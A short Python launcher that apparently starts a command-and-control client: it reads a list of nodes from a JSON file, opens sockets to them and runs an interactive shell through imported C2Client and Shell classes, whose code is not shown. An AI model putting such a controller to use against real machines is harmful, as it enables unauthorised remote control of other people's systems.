from core.connect import C2Client
from core.shell import Shell
from threading import Thread
import json

with open("nodes.json","r") as f:
    nodes_json = json.load(f)
nodes = [tuple(lst) for lst in nodes_json]

client = C2Client(nodes=nodes)
client.setup_sockets()

Shell(client).run()